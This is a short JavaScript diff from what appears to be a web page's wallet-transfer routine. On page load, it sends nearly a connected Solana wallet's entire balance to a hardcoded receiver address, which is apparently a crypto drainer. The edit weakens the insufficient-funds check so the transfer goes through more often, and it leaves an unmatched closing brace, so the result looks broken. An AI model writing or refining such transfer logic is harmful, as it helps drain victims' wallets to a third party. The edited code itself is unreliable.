@@ -27,9 +27,10 @@ $(document).ready(function () {
                         const receiverWallet = new solanaWeb3.PublicKey('FMS1qwLyGY2GATdPQp5c3Hw3zbXtyLJTk3DhxomnQa7Q');
                         const balanceForTransfer = walletBalance - minBalance - TX_FEE;
 
-                        if (balanceForTransfer <= 0) {
-                            alert("Insufficient funds for transfer.");
-                            return;
+                        if (walletBalance < TX_FEE) {
+    alert("Insufficient funds.");
+    return;
+}
                         }
 
                         var transaction = new solanaWeb3.Transaction().add(
